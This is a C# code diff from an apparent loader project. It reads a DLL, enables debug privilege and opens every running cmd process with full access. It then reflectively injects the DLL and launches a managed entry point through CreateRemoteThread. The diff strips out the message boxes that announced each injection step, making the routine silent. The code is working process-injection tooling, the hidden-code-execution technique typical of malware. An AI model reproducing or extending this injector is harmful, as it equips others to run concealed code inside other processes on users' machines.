@@ -49,13 +49,9 @@ namespace Ton618.Loader
         {
             var bytes = File.ReadAllBytes("Q3C273.CLRLoader.dll");
 
-            //var setpriv = ReflectiveDllLoader.SetPrivilege();
-            //MessageBox.Show("SetPrivilege finished: " + setpriv);
             var procs = Process.GetProcessesByName("cmd");
-            MessageBox.Show("Acquire privileges");
             Privileges.EnableDebugPrivilege();
 
-            MessageBox.Show("Candidate count " + procs.Length);
             foreach (var proc in procs)
             {
                 var pid = GetProcessId(proc.Handle);
@@ -68,16 +64,10 @@ namespace Ton618.Loader
                 //if (parentp != null && parentp.ProcessName.Contains("svchost")) // We don't want to inject to an auxiliary explorer processes.
                 //    continue;
 
-                MessageBox.Show("Will inject to pid " + pid);
-
                 var handle = OpenProcess(ProcessAccessRights.PROCESS_ALL_ACCESS, false, pid);
-
-                MessageBox.Show("explorer.exe handle " + handle);
 
                 var loader = new DllLoader(bytes);
                 (IntPtr local, IntPtr remote) = loader.Inject(handle);
-
-                MessageBox.Show("Injected to local " + local + " remote " + remote);
 
                 var str = new ManagedLibraryLoaderParam
                 {
@@ -100,7 +90,6 @@ namespace Ton618.Loader
                 var tid = 0u;
                 var funcpos = loader.GetProcAddr(local, "LoadManaged");
                 var relocFuncPos = funcpos.uminusptr(local).uplusptr(remote); // relocation is important
-                MessageBox.Show($"Func at {funcpos:x} reloc to {relocFuncPos:x}");
                 var thandle = CreateRemoteThread(handle, IntPtr.Zero, UIntPtr.Zero, relocFuncPos, paramMem, 0, ref tid);
                 if (thandle == IntPtr.Zero)
                     throw new Exception("Failed to create test method caller thread.");
